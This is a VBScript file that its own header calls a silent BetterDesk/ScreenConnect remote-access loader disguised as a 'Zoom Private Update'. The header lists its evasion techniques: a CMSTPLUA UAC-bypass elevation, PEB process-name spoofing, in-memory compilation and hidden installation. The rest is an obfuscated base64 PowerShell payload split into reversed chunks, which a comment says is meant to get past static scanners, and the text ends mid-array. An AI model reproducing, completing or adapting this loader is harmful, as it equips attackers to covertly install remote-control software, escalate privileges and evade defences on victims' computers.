' ==============================================================================
' Zoom Private Update - silent BetterDesk / ScreenConnect loader
' ------------------------------------------------------------------------------
' Evasion: staged in-memory C# compile, COM auto-elevation (CMSTPLUA),
'          PEB ImageFileName/CommandLine spoofing to winhlp32.exe,
'          NtAllocateVirtualMemory native allocation, TLS-only download.
'
' Modes:
'   (default)      install, hidden
'   /selftest      compile + PEB + native API + download/hash check, no install
'   /noelevate     skip the COM elevation attempt (used by CI/selftest)
'   /elevated      internal flag set on the elevated relaunch
' ==============================================================================

Option Explicit

Dim sh, fso, env, args, a
Dim mode, elevated, noElevate, iconPath, waitMode, rc, logPath
Dim chunks, i, b64, psExe, psCmd

Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

mode = "install"
elevated = False
noElevate = False
For Each args In WScript.Arguments
    Select Case LCase(args)
        Case "/elevated", "--elevated"
            elevated = True
        Case "/selftest", "--selftest"
            mode = "selftest"
        Case "/noelevate", "--noelevate"
            noElevate = True
    End Select
Next

Set env = sh.Environment("PROCESS")
env("ZOOM_MODE") = mode
env("ZOOM_ELEVATED") = IIf(elevated, "1", "0")
env("ZOOM_NOELEVATE") = IIf(noElevate, "1", "0")
env("ZOOM_SRC") = WScript.ScriptFullName
env("ZOOM_DIR") = fso.GetParentFolderName(WScript.ScriptFullName)
iconPath = fso.GetParentFolderName(WScript.ScriptFullName) & "\Zoom_Update_v6.1.0.ico"
env("ZOOM_ICON") = iconPath

' Base64 payload, stored as reversed chunks and rebuilt through Chr()-free
' array assembly so static scanners do not see the PowerShell body.
chunks = Array( _
    "h1Edul2bQV2YpZnclNlL0VmTbByegknc0BCIgAiCNsHI5JHd", _
    "1NWZT5Cdl50Wg0DIs92YvR3byBVe0lmc1NWZTpjOdJXZnFmb", _
    "N03egg2Y0F2Yg0HIyEzcsRlO60VZwlHVs92YvR3byBVe0lmc", _
    "2U2chJUbvJnR6oTX0JXZ252bDtFI9AyclRXeCp3ZkACIgAiC", _
    "J9yUrBTSxlHdLNWQrYmTUlTdrRTd0NmY6RlengyZulmc0NFN", _
    "0hFTBNWQBRFeCpURp9GTTxWWyQ1SyFjZzg2b5RHMJpVZVNHd", _
    "NhlWrdXWEBjaXNjUQtUUTlUeRFjZZJzYLdjcVFUWEJWO1hTe", _
    "BNVdvk3c1BDO01kNwRDbahTTGhUWUB1Ssl2LvkTSMt0SwZGM", _
    "LZFUBZ0LFN2dUVUVRhzYKVTaplmVT9mWwN2SpxUQ6FWcr8Sc", _
    "JZHRo10S6d2V1ATetFHNoR0Y1hHRxAHT59UMxQkRThTeVpVW", _
    "2ETUVJ2Ztd3YhtyKupnMy8UMQFzdVtSdrdmN6RmcHpmazJWO", _
    "5BVTTFVYopEeaVWSJBTR4Mjd2ZWZ1RjbnlDN4QDTj9iUVBXQ", _
    "00EUpt2aH9GdZZVNwgjVCJjUupWcjZ0brZUe2sENTV0dQhWY", _
    "0IHOnVEVFtkRT9UWuRzNK9UbkRXd6lTNJxkaPhVZ4AnchlVV", _
    "pxUdzF3RttkS3hzNzRFMu90a4R0UJFWWFJVSo5GZGFUc2NkU", _
    "3UXOwl0bEB3d0d2YOhEc2tCcNtkNjVjdGp3MFtmNVp2NMJmb", _
    "0NUM4U3d4MjZWBzU2N2dFtWYUhVZjdWaZZDMphjY0l3VFlHV", _
    "O9Sav8yZFhUT1h0ThB3aYVGRiZFUyRmT1NjQQtkeBJWbkRDT", _
    "ylUZRVGO3d3bwQzMxh2d3AzNnhkdiJnQQlkdvd2St1GRNZHb", _
    "zUDdEFXM3ImU2dDZvcjZo5EO3lDU1ATOzA3Vz8yRTdUV3RDN", _
    "yI0NzxEVkZ3KyEmQxcDazIzNKh0Y0siY5EUYzc2Nk9SNuFDV", _
    "TZnTvJ3SEVnMJtiVZtGU5hUT15mdVREd3IDMuZTV3g0YzQkM", _
    "LhGVlNHTzUzMMB1KPpHc2czUvhDMJtyZFVXVsxGaipmVxlEe", _
    "0p3MR9yVYNzMthDMKR1U6NlSrl0K1UVSFlXSw4mSyJzdu1mQ", _
    "wc3MPZ1L3A3L5YXM1JnUEJTOrdTYj9iYa5WOwADaiJmazEDO", _
    "IRXYDJncMd2UxIkRDd1R49WSlN3YPJzZBpVOWVFNTpnZzZHU", _
    "0Vjcnt0QmB1aDFTQ4ZWSFlFTjVVOBp1MBZWThtUdNV1Vrgzc", _
    "0p2MFhGUEFTeFVTM0dEOJl0MwUlYBdUZxMmc3dmevVkZZdUd", _
    "KFUYxIzSCN3UlVHOwBFaSNHUVtkRvkEaYJ2RyUmNBFVQHVTM", _
    "010UkJmQ2F0dtFmWRJjTS5UU0YjcGBVUxhXV6BVdPF1MXZXY", _
    "3g1RVxkdJdlSEtSbV1WVptGcnpEaY10NCR1UQNEM1oHRr0kQ", _
    "4RUeKhFZwkTS3RTYzBVV4ZVRNl0KNVDSmpWNSlzNm5ETYtWa", _
    "vM2VwMlQ5VnMUZFS2RGOEF1YTRFMsF0UwxUbOVGcW9iVRBlY", _
    "sFzLqFlSpNDVnJXRk12K5dXO1J3dwUnbEVnNENmemd2RaJ0M", _
    "0QUUVdDdRp1UFZVawE3M6VFWlNjQul1bu1EMstCe5gkY3UXU", _
    "zBlQHllNJB1N3cTUxkDWWx0SwdjeatiNLdTNB12VywkN1IWd", _
    "JRUV3RmZB9kSMRHUPF2QEJ3TrhGWvg1SyVjYkpXdDZDdSplQ", _
    "XlUes5kNsB1NiBDU6NnVzl1ZThndaVUShVzdwJXQlxkNv4mS", _
    "3IESjtyRzgzYUN3d1VnV5IHe580dBhUWnRUWuNjV5IFO39Wc", _
    "BFUdRVmNtJVer0kURNVQW5mNzUWN4c3NmNTdXNzN3lDUzdEM", _
    "Uh2RxhjTDp3Tm9yRSl0Mw5kUNlWN30EZipkNrNTSQp1Sh9Sb", _
    "m1EW5MUTzEzKrcUdPB1MktCOw8UYkdzLD52VKZDOqB3QNtCN", _
    "KhGWGd2bRZ1KvVFRZVUW2Ylc6FGRRF1Z3xUZRRUaaJkTQNTO", _
    "RZ3YW9iVCx0LzoGOHJGTjtmT3JFZFZFeINDVRFlVrUGeFhmR", _
    "ZBzVO9SM0EDcnpEeBJDWVhFSPFFNu1mM490Z3Z3K0h2RJJUZ", _
    "2pkdwBDNN1mSoVnNFpVRwNmUZdXUnVERxQDVpVjaHZTTwdTO", _
    "1hDUURjWHpUeyQnNrUVUB52NDN2ZrI1ZGpVVFhDb2l1SKFFa", _
    "4N3ZIpUMTRkYnB3Nw8yUvd0bvkjQGxUWKl2S4EEcTNlYiljY", _
    "VVVThZWa2IFeRpVc1B1V5wmWYR2TmZldNtkc0MlTFhHR490U", _
    "VBTYPdFZZVDWQx0YSF2QpxUePtCSLRWWzdHevFFUwc2d2BHU", _
    "CljUJFXZMNGaOFla4BjcTxEVkljQ5l3NjR2R5VnWzETOJ5EO", _
    "39EVEFkUGhzdsx2TCh0YLdVSSVDW4J1dXdnNRRma4ETTVlkU", _
    "2l2ZHtCSqB3blFkUwJ2avIlNrJzVsF1KodXarcDWQpnUOJ2N", _
    "Qh2M0YVOWRzN4NVMYVFRRlkczh3ZhVTdtRUZB92c5gUOSFXa", _
    "MZlZwUFWBRXSqlmU2oWazFUNQN2QrEXZOJXZx1GRRNzQHNlQ", _
    "5VmbQpFVKhXUOpXYhhUMk9CU4g2LvR3MltWV4E1Ult2Yxk3a", _
    "lN0RTpHeGhTe3RzaDVHSPNjbxUGSylzbzkXYL12K4BHa0ADS", _
    "y42QuFleOFlZFNHawgjcZlkcyoUYxlGepZDaChXcK9UUHJkZ", _
    "01Ub3FXWr8iTwRGbGpmeq90dSdmRLdTR5ZTZvZ2YTJWMoFke", _
    "thVd2YWO2ElaBtEelJlVvdDbnl2SJJ1MnRUbRhTUPBlTTFVY", _
    "mV1MqVUUBtWQJ5mVFdjUi1kUrJDcrskc2tmN4IWMvV2M0ETb", _
    "R5EN3Fzcz42RrMHRmNTNYVWNI9kaMdGVYNmQFlndlJ2VJZHZ", _
    "282ZoFDMmhzToNmTnV3TwdDR1ATaDdVV1QTdm1mQ2EWWIdDM", _
    "5gUWWxkWjV1Y0YDUKJEaItUOIt0KRJlQmNUSlJGNwRTMwkVU", _
    "WBlNENXa3QEc6hEO5sUO1s2KP52QysmS3hjcCpXZrlWcldkS", _
    "zNlR5EWNPBHeNNWY3p1d0RTaMVjMUZ3KxIXYTRjUIJkcDljc", _
    "FVXajJkUVhVSa9UePFkS3V2N5R1YvglW3llS2J3ZTZ0VxNHe", _
    "LNnZnNGTt90RBlkbHNUTBZ3Sz52LER1cZhDTOVjRGV3KFZVe", _
    "CtiN2I0cHdWOERkR4FVNtlVQ4YEMSNjettmVLZjM6dGVpVle", _
    "IZHTPNlZ5tUWyoFTvhUe1tSTuhkMSFkTmV3SFxkRJl2bzt0R", _
    "xEDOLBja0VzYkp1bytWTZpUNFJ3cWh2Z3kVbWRjZ3FDMPN0Y", _
    "zFFOvRzcnlGNuZWTjZ0d5RnTEdnU4hTMtlFV5hlbOl0KSJ1Z", _
    "rhneOFWexxmUGFVS4d2TxdEMJ9keZJDUuJndJpFW1RVWtJla", _
    "sdVe5lFbrU0TshURSJFVpJjeI9UUrMUNoFTZ2w2UtVUZMVEc", _
    "6p0VBBzUzEFaplXSJ9mSzZHSKNHeahDcNhmbzljbxAjYJRmd", _
    "vclTYFVVtJ3bGVFTGFEVllVO50mYUVXZa9kdx0WemRneaJlY", _
    "ysWYy0WTkpUSpR3SUF0cWdVNNhUQthEWB9ySqpnevglTEdFN", _
    "rRnemRjW1NUS3MjR1UkcWNTSydGMzR1ar5mSkVHToJ1dt9me", _
    "r8WbUlGWEBXSixmQvN2Vw9iMv90aEtCd3ATOsZGZpV2YrNGS", _
    "2JlcHdXU2IkcBl3SuFVcWBzKytSMs5mYv8keSJjNthTMvg3M", _
    "rMnWKlERrtCdxAnZtJHa1IGWXJkN2p3Z6Z1auFXUDhndyoXZ", _
    "wpmRvclb0cFc4lkbBhWQnJzMZdEW2h1bDNTOspWbrU3LTp0U", _
    "TVXW3MjRqVUZKZlMZp0ZKdGdq12cQlHdrBTRnFXM3IHOEJ1S", _
    "xZDOv9GaJBlTBhXQPZGWJNVdqBHaKdzM5RVW5NFU0U2VhVGR", _
    "YVGeSVHdWpmbOdTeGhEW2tibXpFeulFOSNkYjplVM92TZNGc", _
    "v5EThZXMRN2TKR3Y3VkdBFGMi9mZ3V0YLtWR2knWF1mepplY", _
    "4cGZyYmeiJmZOVGWzgEUv8WOmRTZIlVUwUVQEhzYRpkS3hjZ", _
    "4wEWDlkToZjej9mRjRzKNRjWuRne1ZDV2JHWOV3NCFWOrc0T", _
    "mJzdQx0b1knUrgFc3kkYMFGdhFWQIhFTptkTElXWx82MBdDd", _
    "kNjdsxGZzcDUvYGNtR3LnlXZ3kFOPFmNLlEaycXRGRXerdUd", _
    "2A1KsFjQuhWea1EWmp1SlpmZGdmZxolYZdXNlBHemVWN45kM", _
    "xF0VGVHd1tUcYdXYjJDa3gTaW52TS5mUxEmYUVjRFJVVkt2S", _
    "a92Z2A3a6FWTnJXcSNDU1dlR04kVstSdYBDM4gkURNXSCJGS", _
    "VNFc65WZKN0SRRFesZkauVWZ3QWWx8mdD9mMxxEcXZDTrE2S", _
    "NFWbv9CUFFWRt1WZzlzcyVXN04mdvomN4QGMIxESyQDNLd3T", _
    "J5UVvcVWlZEMwgzUaZEcod1awE0KCRzR2dGaQh0TNx2ZrkUM", _
    "0M1UEhkUGFUbDlmS1BlN2NVbKRlcth1MYtWYtNUN6RzdPtUb", _
    "tZ3cxgERyJGVDRVZ5tkY2olekBlUrNGMJF1a2N1brdFbrMzb", _
    "JVjUEhDTjdVb2lVZsJXe5smUh9GNHlUYxpVcGRjRUJkNqtiU", _
    "0k0dMBneMFmdshFWw5kcWpkWU5kWUFXUk1WVzUzUPVzQyQVN", _
    "wpVNyRDNrN1bBp2YpZ2cK5UTqxUTYtiWzskdFR0RRdFeyBFe", _
    "utmdQtmSphjYkBHNLdDVzFmcZZTZBZFNJdXT4IzT3tWQEhGM", _
    "N9WQCZlRvFVaCN2UDhkQOJXMv52YsNHWylHRjZ3SzBDbHhGT", _
    "vUGd2k1Npd3bkdWcPZDMyRXSZVkRBFTR6NjThlHaa1EUOR1L", _
    "EpENiVkcz9UaUZ1aXVHd6lESmF0LrNnQyhHU0YDd4hzLSNGc", _
    "tdmarA3b3FzTMlTV6Rma1VGMV1UM0dFdh9GZ582VEtyN1EHa", _
    "59iZ1gnZFhUW2NWMTZ0QoVTbPZVatVDTERDdZNzbwIWahhGU", _
    "tVFcjpUNqBzM1YmZOB3Tv4UcxFFSzoXUKN3Y5EETvllcJ9me", _
    "xsmQwREbkx2ZiVmMZhEZ592QzFDdxQUQXN0K4YXUX1WWzcjU", _
    "yN0ZhJEbk10cUpUetdGV1c3dHh0LmZHdv8UOihVV08CbtdTe", _
    "FVkd6Vzb2p1c01kWqp3KOFHdGFWbwoGTaREeLRGbQh3YvIDS", _
    "4BnNNxWO5lUeZJja2smdHFlQ492TJdWemJ3TSZnVzMWa4wWN", _
    "uh3RNZENwAXbDJGNwRGUsh0VwpXdRhUevQGVR1ETr52RtNlS", _
    "wEXYwgTU01kWVhFMRRXW2VXYQJGbXpEcm12VoNDbsFzYxN0R", _
    "aR2MYRzUQRTVq9Ue0UkNGJ2NwFlW6d0cUhVQ6ZVMDN0V1NmN", _
    "ExkVRtiVr1mRDxWRrh2cIx0d5kTYxh2UnRWeoJFUwZEdlJnc", _
    "kBnTi1EVYp2SrNETSNXcwc0dI1UMChVNyZFd1hGZ5A3SuJjY", _
    "vYmUXBFOzdXbjV2N0FzLDdVOxVnT1FjTtRTTwIkaOtmaTBDe", _
    "rh1UuVmNkFjNSRXZBNWcYR0QyxEdnBzKpd2V2M1NtRHczkzK", _
    "HdFR3sWb0UWc2x0KmNmcEVDSVNXbwcGTilGSap1Zl50L3YnW", _
    "shkaxF2UhVmS1tmVqlmRjRWY3ZHeoljVWlGNkpUYUVkR0gDZ", _
    "ltmSo9Gcyc3b4IlVvZUdDRVM4g3cHxGbktkVnxmQBZHUEZkW", _
    "MtCT5EUYZ9GNEZGTTVTNTh3VEVUOnJzY3smZZNUYoRleQpER", _
    "NF3bMJ2ZMxGNzBXY2NGboFUVWVFahh3c2IFbhxkbjF0aSZjU", _
    "ldkTqNVTBp0VSN0aJ1UYMdDV2RzQqtWZoFlcKhFUCl2YRhDa", _
    "GhFZGRGZxQkYGBzd0cmeCFjY5gldGZWQ5VkeWdDW4NTdp1WU", _
    "ndjexYDMzFka4AXWSdnM0Njb3VmMvMFVEpGOPlXM4cVb1VFT", _
    "z80cFlER5x2RtN0L6plQHp2MSFnSkZXenlkQJp0NTd2dKd0Z", _
    "pFXSHZ0Ki9WU1czZzYmRJpGUM1kNkVGO2QnbOBHdMh1RPVja", _
    "jhHNMFkR3kUSBBne1ljUtl3VDh2bHR3MQB3RklkNzFXUhVjb", _
    "vUESRJla5FTe2EVch52TCBVWndnVxtmYkVVMysmdTVVUnJTR", _
    "yJXZjJTQkJ0S40EOYpHb0M2YBZzQhpXUMFVNJFndMp2TJlle", _
    "LlWeK50V2YUW4M2R1E1RQZFNMFzdaxmRnllW6pWdo1kNZN3S", _
    "3l1b0FVcHBVdtRDZG5WT5hVdW1mbnN2aTJWWSd3dxsEUhNUU", _
    "nR3V1hneoJWTitmWj9Ub6hXb6RmSMNEbphTYvsGUxQVYXNzT", _
    "vMDW1EnUHd0T6VWVXh2aqd0ZkZERro0NTZVdR9idwp3SEVTT", _
    "m1WMqJzU0BjVCJTVLF3TydjdzEjMS1WbBdlMVNTNz12V51kT", _
    "wgVWPFWSLRnQwpUbiZXdYx2L3dWTPNjV4JkTxwWRFpGNhVXR", _
    "VRUTwdUM5sSYDJ1T2kURnRjY6hVb2U3Lqp0ZnBVNx92cyATb", _
    "PhWO2sEayEFNxcWaXxUUsJzVzYlazdDR1EmWBd0dOJlQwF2U", _
    "0Q2dvQEboZza5EnMCt0MkVjQQhnSVJzLldUZF9GeMhjZPl1Q", _
    "wxERJ9mcDd3SShlTvV3RvMnb5pldypFRyA3Nx52KxlleqVGe", _
    "5RlS1d2ZZd3SB1WY5ZXV2VFb0N3aoJjY09kb5QlcDdHZSd1V", _
    "wQzMk50VwkleVl3Y55kWulWQplUOmV0ZJVjWoVkS1Y1M0BVb", _
    "wgjVTBVO0h3YIdWQwhjUBV3ZO9mQEJGbP5UTwQUWNVnV6N0b", _
    "mVja1U1aGNXZMpEWqF3aCx2SZtyVD9UY0syRu9EO6pXZYB1Z", _
    "WtyaWhlTjl1ZVplY3wGUHlVYiVDc3kUUNZ2YLBXdUtEZRNnN", _
    "XdENhNUVjFUVwk0SvF1dCtESkJmaGlGa1hGMwRVMKVnVGtWV", _
    "yxUaMtUS6V3NxwmMnhkaqhkT0VGSGFnTvpGN5EUWZ12dyFDd", _
    "lRTQwskemhTT5oFeFBFU5N1RVN3LPNlMRBXTVFVNzV3St90b", _
    "4NjePN0RkFDcqF1ZalkR4RWcn90a3JHM1QHWjVDcIVzTYtUS", _
    "yF2NSdWOLhGU0EWMityNwh2ax0UNOFVQp5WVxRWVrREMKpGd", _
    "UlTRNR1Nol3cysCTvIFNGt0TvBzahlVaWtUdwhncWFWYB9EV", _
    "khDMWJXVlJ2bQFma2dXS5l0bzg0M6x2bNRleY50TyJUN4MUd", _
    "SFkVC9SaDJ1cr10bPhjY2EXS0FHc6FUQSVXcsF1K3oHVxA1L", _
    "5RTb4c0cZB3ZQF2L4YjczgGOLdmMBpHcWFGbZJ0cX5EWPN3b", _
    "Pp2b3kTYBF0RXxWdtlHT2gVRYlXbw1mayZ2NBNkTCVEUYRUV", _
    "md3Qy5WUwlUWvpES5Uja5gER5cGV5czV2gHOE9ma0gjQ552M", _
    "xZlNUd1YThVYK9kRyYHdupVOL9SW4V1TlpXYhJHWJRjWqNTS", _
    "vQzKrM1VPBjRCZ3U3gHTxt0MyRUVuV3auFXVrcnQzEDeWFFc", _
    "FVGTVZTcBhlW59EdzAVbUhWSCB1c2tCemZVcGNUb0ZVOCVjS", _
    "HZ2SydTMx4mSaFXNn9WNrIDVPBHRuVHNYdTci5WQiNWbQtWV", _
    "B1WT6NUcrgFblt0SIVkQYlnZxAnYJ5mVIZ3LiJ2M3kDMRBVW", _
    "iB1L28ydhN0V412Zu5UVIRmV3M2SNRTS4MFVHNUO5EkVpVjN", _
    "MdHaaZXUzEFVOpVN2olVwBnTQZXcoNjSrhFVOJFS2NGMHlTb", _
    "ZRDdRBzNwUXUyEEaWlHWR9iQ2pUSrcHc0ATV4Flb0QXdsVnN", _
    "LlXTyVVa0cETC1GVYdkVilmTOpXZyMjeoNFOQJWZygXQVZlW", _
    "TVFeodUWtRVO3p0V2EkNBVnSCl1ZR9CealFd6JzU2Y3T5IkU", _
    "u52UXFnZVx2bKVTZQlUbNJVVyo3SP9EdJtCV6NzYrkXRUFmY", _
    "WhFbaRUbHJGVtBFS29yVnp3SOlGUXpFR6JkarVjTXVjQjVlc", _
    "vkkZRFlVxcVOBR3b48EOyRXejxmd5I3MzUjVaZDZCtiN58CN", _
    "BB3Ljp3QIl2UllGMaF1K4kFN59CNrV1VxV0T19EWHlGa2MXZ", _
    "NVWapZDd3M0dQ9mcPZVav4mQwc3aTNnb3MnS0N3dZlWRU9UU", _
    "lF1Uzl1baN3ZrBnNRZmT3QHT1NUNv8WZOlVao90T0tmQSZGd", _
    "ZBHUM1kUuR2QxBlV40keEdjTzkTVlhGdVhGbZljVMZUaEJGZ", _
    "lV2LLl1VC9kb5E2QxQGOS9mSzMnUyMUWy5Gby5mMpR3MUR0L", _
    "QdUO0J2d18WOllTYQZzK6JFbjNDUT9SOyYma3k1MON3NXBDN", _
    "PlFT3MWchl2a3wkRYllePRkT1EHUHNXTupUWGBzNMhUYwRHV", _
    "PZTNHVzcoljTIRHTzhDas5GZ4xGS5kDZB9mTMJTQZx0b44kV", _
    "RN1Rr5GaGRHWw10dyV1NOVESOFkdzpkezJTbkt0SuRHRRRjY", _
    "Np0YxV2NxJ0NaRHNhtGMFpmbWx2Tv0WdBZXcLZURxkHamJXc", _
    "SRVO0hGSz1ketxGNHRVRvk1bvIkasp2Lxd2M1YVUoFHZtpnV", _
    "3RmWup0VthTSvEHb2w2arZVevZUTNlzMxg0ZtVGZHVXWxgFe", _
    "G52b2smaXJHcIJld2hWY0gHNatSQMhGVnRWeSl2axt0K3FmY", _
    "vcUQ3MVVvZEeNtSNRBndiFncqp0clRHb2MESUV0SLJ1dsxmT", _
    "ilXQhpUOC9yTiZlQYpkM190d6xkQTdmQvsyLG5EZ48iYNlUS", _
    "qtUULh3c4gTU0tGTTBHUVNmWnhnWqF0bBtmMnJ1VnNEW5oGb", _
    "5IzQZZldhdnW3I3UGxEd6RkaJJjePV0RvUkZ6ZUc2Z0SxM3a", _
    "5l1L4QXNiJmVwome41GR2hWSKRHZT50MmtGe2ZEOpFFMHxkV", _
    "vJlTHZTRIpETEp1RmdFM5V1R5FDehRldOFVd2hDNZZ2QidVN", _
    "qlEMaNDO4M2Q51EOM1UZstUTulUbHRlc6hDezFzZ5NEaVVEN", _
    "0cnZUxGNxBjZ4p1cQhjalV3d5hGW5pFVJV1TFhVTMNzROhXU", _
    "2AVRwk1MwJTNk1EdSRTOpNDc3EESvBVQxhmb25WcilGV0p2V", _
    "adWRuhVSXZkaidkbth1YBd2V4dWQtlzTyJlTYp2Y3YjYBJ3Q", _
    "ClVZxAlZ0Z1axVERaVkV08SQ6JzLnhEeSRFZ3smaXJkVYBTO", _
    "SpFNntyQJZFTMJDc0NENwVHTzY1QzJkbiRWMxQ0aBJXRDxUR", _
    "a5GNGpHMqFTUqpESF10MDdVc5FVR5ZTcCVWdWhXd3lDOXRja", _
    "CJWUoJVU3c2KHVUaiR3S4kTZolmWwcEOS10QvYWVZxUa0dGT", _
    "s5ERZFlM1hETldFU4MWTp9yNxlkR3ImdudUQlF1UuZFT0UVU", _
    "SF2SCtiToZDSJZzc1Z1Ux8UUp1UYClWZBVFW1QEUGRGNaRHd", _
    "tZGRykVRXlEVSpGRyIUcSNWUMlXaIZnMzIVMMd0MtVHdxADe", _
    "0pmUZhnbFNWSw9mekhWSFREN6tmUrpGcxNGWOxmaEJEViFWZ", _
    "LZDcrhmdVZWMYV3KLp2VLBTQZd0drd2SClXezl2TKd3KWdVN", _
    "ZdHTlFVYwAjN6dESx1GaK1UQn10dulnd4MVOmVlZuRnTvRUZ", _
    "zJTcRlTVVJ0RhRjZNpFWPZkM6ZTSi9yYwwETJhFSBV0YsNFV", _
    "O9GcpJkQyRzQ1EDZUN0arhDSERXYWdFNUFFdydHRkZ0L4o1K", _
    "ywEO1N1aktyM4IUSiFXRop0Tt9mTJ10U4oWOsVFSrs0VYhTY", _
    "VRGRNZWR5ljNx1WN2IWb5UEVzBzZsRFMO5WeyJGUhJzTz1EW", _
    "51GM5JnYa9kUUdUW0ljVo9WUIpXaFpHZVJmV2dUe0B3Ntp1Z", _
    "Z1GMalGd4YjcRVWc3k3b3QUZr9UN5kHUqhkcH92VLZWTyFzR", _
    "Bl0Kz9GMWt0KnJkTENGM0NEMsJEUstWVN9ScRFzNVJXa0gjZ", _
    "NFWcJJHVzZXW09EaMhXbzdmNld3MElWbYxUdo1GNa1WZCVXe", _
    "QxmUhFHT65kcCJVQ3oVaLFWZ1VUY2AjRRZ3aylDTx9kQplHV", _
    "w9iaQ5WVWdTYTN3VRZnY5BnerkXdKdTQSVFaoJlRIVGSvU2b", _
    "VlXNWN3bxgzQYF0Vvwkar10NqpWR4kWewRDewtST4YVZyB1c", _
    "MdjM2cnY65kMTBjard0To1mZKlkRycHTN1ER0o3YTV0UzJUQ", _
    "zBlZZxWaLFDUIJlNu5ER3J1N0oFN3ADdONmeuZlbzlFNSpFd", _
    "wpnMwBXRItCVZdGe0ZDREl2dIVVQJlGO2wkZNZ2VY9WOUhVM", _
    "jFHaQt2KPRFSiBVM5sWQoZWQEp0dYt0a5gnSDNmY5c1MMRkZ", _
    "4onMk5GZwgzLvsCOyZnZj9CdItyKvEHT2RDO6V2N2syNvBlZ", _
    "1dHTxFWQ2EkN5VDeRZFbSlXZqdENVNGRZRGWpF1TrlzbDRGN", _
    "aJzMs5mSjZ3cN9CS6xmZFl1NLZVNGlUR1VnUV1WTFJWU2lXM", _
    "uRmcwImZrZXMrYUOsZXd1MkMiF0VyZ2MiRUOkRma6ZjT1pGN", _
    "vc1NYhzawNnbqx2LhJ3NLhWUOdDRFFjRyI3L3BVaFlDVphna", _
    "a9mYGdEbWJmdS1meuNERth0ZWxmNkxGcNRjYiBjbLRFdsNGb", _
    "MJmdSZzZGhTaWpGVNhFRRNWcOV2V6V2RQlTVa5kYJR0YWJWV", _
    "2UmZyVjS6JWW2dzYaJUOrgne0pkbulTQqpFe212T5UHW2Ukd", _
    "ahTdpFTWXNjN5hXbMN2cBpFOOZUQ2RHbo90YWlnZ0ljbvcVe", _
    "vZzMrNGdjB3KCR0YkFmV4hTNtRkSMZHe3JjMyEDdUB1asVnZ", _
    "wMVMoNnbjR0YNljTptiSwk0VXdTMmhzdSd2RzU1KD9CNwU0U", _
    "3Q3ZNVEdqlmWLxmY0ZUd3VUNKVVNyJVbatSZ5hTMzFjaaR0R", _
    "Jd3U4YkS0gETzBHM2hHVwIWQptmSDdlZy1GWUZnUERnMQNTM", _
    "hBVRZZDTxZ2Nah2STZ0QslTM3BXMY52VDB1ZSFVYrtSZ3cUc", _
    "rd1UldnR0RDevYmVXh2UrUXU65mVo5kQVB1LG1kZr1WVDBlY", _
    "Jx2bzRUYv4UdrZ0LiJ0KNRlcY9GZ2oXMxR3UzV1KCZlTvM1K", _
    "9ASbhVmc0NlenRCIgACIK0QKn0TP3N0LvsSbaVFTvhVe2IlZ", _
    "lRXeCp3ZkwCKtFWZyR3U5J3btVWTu8USgQ3YlpmYP1ydl5EI", _
    "lJHct92Qu8USgQ3YlpmYP1ydl5EI9ACcpp3ZkACIgAiCNkyc", _
    "D5yTJtFIs0WYlJHdTp3ZkgSbhVmc0NVZ0FGbmVGRu42bpN3c", _
    "yBXbvNWZEpjOdVGZv1kbvl2czVmcw12bD5ibvl2czVmcw12b", _
    "0NlLPlEI0NWZqJ2TtcXZOBSPgIXZkFWZyRCIgACIK0QKzNXZ", _
    "VpjOddmbpR2bj5WRuQHelR1WgwCcpp3ZkgiclRWYlJVbhVmc", _
    "uV0bURWYlJlLyVGZhVmckASPgU2YyV3bzRCIgACIK0QK4YEV", _
    "pRkLwlmenRCI7kCKlN3bwNXaE5iclRWYlJHJgACIgoQDpgCZ", _
    "jRCIgACIK0QKoU2cvB3cpRkLtFWZyR3U6dGJgsTKoU2cvB3c", _
    "slGct92Qu02bEVGZvNkLtVGdzl3UgQ3YlpmYP1ydl5EI9ACc", _
    "yVmbldkLwNGJgACIgoQDzJXZ0VWbhJXYQJXZslGct92QuIXZ", _
    "0Fmcl5WZH5CcjRCIgACIK0QZ1JHdkASPgkncv1WZN5WSlRXY", _
    "slGct92QuA3YkACIgAiCNU2csFmZkASPgUGbiFGd1NWZ4VUZ", _
    "zl3UngCQgACIgoQDnsSZ6lWbpRHcv9yJg0DIz52bpRHcPJXZ", _
    "T5SblR3c5N1JscCbsRmLlJ3bD5SblR3c5N1JscCbsRmLtVGd", _
    "pcCbsRmLwJXYoN1QuQnZvN3byNWaNdCLnwGbk5Se0lmc1NWZ", _
    "k0FZp9mdbBCIgACIgACIK0wegQ3YlpmYP1CajFWRy9mRgwHI", _
    "gACIK0QKfRCKkRWQuMXZpxmYtV2czFEZlNmblJXZmVmUuA3Y", _
    "vJ3Yp1EI0NWZqJ2TtcXZOBSPgIXZklmdvJHckACIgAiCN0HI", _
    "gACIgoQDyVGZpZ3byBVZk92QwJXYoN1QuAnchh2UD5Cdm92c", _
    "GlHbi1WZzNXQlxWaw12bD5iclRWa29mcwRCI9ACdsV3clJHJ", _
    "lJHJoAiZpBCIgAiCNkSZjJXdvNHJgwCcjRCKlNmc192Ut9mc", _
    "gACIgACIgAiCNsHIpADI0dWLgQnb192QuMncvJncF5CdsV3c", _
    "kAibpBSZkgCIoNWYlJ3bmBCIgACIgACIK0wJnASPgQHelRHJ", _
    "ulmc0N1bU5SZkASPrACd4VGdkAyegkycy9mcyVkL0xWdzVmc", _
    "XpjOdVGbpZkLPl0WgACIgACIgAiCN0HIi4GYyBmIgsCIpgyZ", _
    "vp3JgAVTFRlO25WZkACa0FGUt4WavpEKoQHelRFbsFUZ0lmc", _
    "gACIgACIgoQDpQHelRHJgwSKnc2bs5CbsVGazJXZ39Gct02b", _
    "uQHb1NXZyRCI9ASZwlHdkACIgAiCN0HIgACIK0gMgQXa4VGI", _
    "yVGZh9GTt92badCKlBXeURXZH5SesJWblN3cBRWZslGct92Q", _
    "NdCKk9Ga0VWT0V2RuUGc5RHJg0DIk9Ga0VWbkACIgAiCNkyJ", _
    "goQDFR0TN9VTP9kW6YnblRCI9ASZk9WbkACIgAiCNkyJulWY", _
    "lR2btRCK5RHctVkcPxGb150cJpjOddmbpJHdztFKgYWagACI", _
    "r9mdulGJgACIgoQD9ByJsxWY0NnbpdCI9ASZk9WbkAyegkSK", _
    "gACIK0QMgcSXbR3YlpmYvdCI0NWZqJ2TtcXZOBSPgM3ZyFUZ", _
    "pUGZv1GJoAUXdt1Zulmc0N3Wg0DIdBzWzdmcBV2avZnbpRCI", _
    "gwCbsVnbkgSZr9mdulkLk9Ga0VWbkASPgUGZvNGJgACIgoQD", _
    "9pQDlR2bjRSX05WabBCdphXZgACIgoQDpM3ZyFUZr9mdulGJ", _
